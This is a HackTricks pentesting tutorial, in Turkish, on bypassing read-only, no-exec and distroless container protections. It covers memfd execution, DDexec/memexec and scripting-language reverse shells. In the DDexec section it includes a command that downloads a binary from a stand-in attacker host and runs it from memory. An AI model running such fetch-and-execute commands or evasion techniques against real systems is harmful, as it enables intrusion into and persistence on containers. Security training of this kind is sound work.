# FS protections bypass: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha ayrıntılı açıklamalarını bulabilirsiniz:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec senaryosu

Özellikle container'larda **read-only (ro) file system protection** ile mount edilmiş linux makinelerle karşılaşmak gittikçe daha yaygın hale geliyor. Bunun nedeni, bir container'ı ro file system ile çalıştırmanın `securitycontext` içinde yalnızca **`readOnlyRootFilesystem: true`** ayarlamak kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak file system ro olarak mount edilmiş olsa bile **`/dev/shm`** yine de yazılabilir durumda olacaktır; bu nedenle diske hiçbir şey yazamayacağımızı düşünmek yanlıştır. Fakat bu klasör **no-exec protection** ile mount edilecektir; yani buraya bir binary indirirseniz **çalıştıramazsınız**.

> [!WARNING]
> Bir red team perspektifinden bakıldığında bu durum, sistemde zaten bulunmayan binary'leri (backdoor'lar veya `kubectl` gibi enumerator'lar) **indirip çalıştırmayı zorlaştırır**.

## En kolay bypass: Scripts

Binary'lerden bahsettiğimi unutmayın; interpreter makinenin içindeyse herhangi bir script'i **çalıştırabilirsiniz**. Örneğin `sh` mevcutsa bir **shell script**, `python` kuruluysa bir **python** **script** çalıştırabilirsiniz.

Ancak bu, çalıştırmanız gerekebilecek binary backdoor'unuzu veya diğer binary araçlarınızı execute etmek için tek başına yeterli değildir.

## Memory Bypass'ları

Bir binary'yi çalıştırmak istiyor ancak file system buna izin vermiyorsa bunu yapmanın en iyi yolu, **memory'den çalıştırmaktır**; çünkü **protection'lar burada geçerli değildir**.

### FD + exec syscall bypass

Makinenin içinde **Python**, **Perl** veya **Ruby** gibi güçlü script engine'lerinden bazıları varsa çalıştırılacak binary'yi memory'ye indirebilir, bir memory file descriptor'ında (`create_memfd` syscall) saklayabilir, bu descriptor bu protection'lar tarafından korunmayacaktır; ardından **fd'yi çalıştırılacak dosya olarak belirterek** bir **`exec` syscall** çağırabilirsiniz.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Projeye bir binary verebilirsiniz; proje belirtilen dilde, **binary'nin compressed ve b64 encoded** olduğu, bunu **decode ve decompress ederek** `create_memfd` syscall çağrısıyla oluşturulan bir **fd** içine yazan ve binary'yi çalıştırmak için **exec** syscall çağrısı yapan bir script oluşturur.

> [!WARNING]
> Bu yöntem PHP veya Node gibi diğer scripting language'lerde çalışmaz; çünkü bu dillerde bir script'ten **raw syscall'ları çağırmanın varsayılan bir yolu** yoktur. Bu nedenle binary'yi saklayacak **memory fd**'yi oluşturmak için `create_memfd` çağrılamaz.
>
> Ayrıca `/dev/shm` içinde bir dosyayla **regular fd** oluşturmak da işe yaramaz; **no-exec protection** uygulanacağı için bunu çalıştırmanıza izin verilmez.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), kendi process'inizin memory'sini **`/proc/self/mem`** üzerine yazarak **değiştirmenizi** sağlayan bir tekniktir.

Böylece process tarafından çalıştırılan assembly code'u **kontrol ederek**, bir **shellcode** yazabilir ve process'i herhangi bir arbitrary code'u **execute edecek şekilde** "mutate" edebilirsiniz.

> [!TIP]
> **DDexec / EverythingExec**, kendi **shellcode**'unuzu veya **herhangi bir binary'yi** **memory'den** load edip **execute etmenizi** sağlar.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Bu teknik hakkında daha fazla bilgi için Github'a veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal sonraki adımıdır. Bu, **daemon hâline getirilmiş bir DDexec shellcode'udur**; dolayısıyla **farklı bir binary çalıştırmak** istediğiniz her seferinde DDexec'i yeniden başlatmanız gerekmez. DDexec tekniği aracılığıyla memexec shellcode'unu çalıştırabilir ve ardından **yüklenecek ve çalıştırılacak yeni binary'leri göndermek için bu daemon ile iletişim kurabilirsiniz**.

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde, **bir PHP reverse shell'den binary'leri çalıştırmak için memexec'in nasıl kullanılacağına** dair bir örnek bulabilirsiniz.

### Memdlopen

DDexec'e benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, binary'leri daha sonra çalıştırmak üzere belleğe **daha kolay bir şekilde yüklemenizi** sağlar. Hatta bağımlılıkları olan binary'leri yüklemeye de olanak tanıyabilir.

## Distroless Bypass

**Distroless'in gerçekte ne olduğu**, ne zaman yardımcı olduğu, ne zaman olmadığı ve container'larda post-exploitation uygulamalarını nasıl değiştirdiğine dair özel bir açıklama için:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless nedir

Distroless container'lar, belirli bir uygulamayı veya servisi çalıştırmak için gerekli olan kütüphaneler ve runtime bağımlılıkları gibi **yalnızca temel bileşenleri** içerir; ancak package manager, shell veya sistem yardımcı programları gibi daha büyük bileşenleri içermez.

Distroless container'ların amacı, **gereksiz bileşenleri ortadan kaldırarak container'ların attack surface'ini azaltmak** ve exploit edilebilecek vulnerability sayısını en aza indirmektir.

### Reverse Shell

Bir distroless container'da normal bir shell elde etmek için **`sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi binary'leri de bulamazsınız; bunlar bir sistemde genellikle çalıştırdığınız her şeyi kapsar.

> [!WARNING]
> Bu nedenle, alıştığınız şekilde **reverse shell** elde edemez veya sistemi **enumerate** edemezsiniz.

Ancak ele geçirilmiş container, örneğin bir Flask web uygulaması çalıştırıyorsa Python kurulu olacaktır ve bu nedenle bir **Python reverse shell** elde edebilirsiniz. Node çalışıyorsa Node rev shell elde edebilirsiniz; aynı durum çoğu **scripting language** için de geçerlidir.

> [!TIP]
> Scripting language kullanarak, dilin yeteneklerinden yararlanıp **sistemi enumerate** edebilirsiniz.

**`read-only/no-exec`** korumaları yoksa, reverse shell'inizi kötüye kullanarak **binary'lerinizi file system'e yazabilir** ve bunları **çalıştırabilirsiniz**.

> [!TIP]
> Ancak bu tür container'larda bu korumalar genellikle mevcut olur; yine de bunları aşmak için **önceki memory execution tekniklerini kullanabilirsiniz**.

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde, bazı RCE vulnerability'lerini **exploit ederek** scripting language **reverse shell'leri** elde etme ve binary'leri bellekten çalıştırma konusunda **örnekler** bulabilirsiniz.

## References

- [1] [DEF CON 31 - Stealth ve Evasion için Linux Bellek Manipülasyonunu İnceleme](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng ve in-memory dlopen() ile Stealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
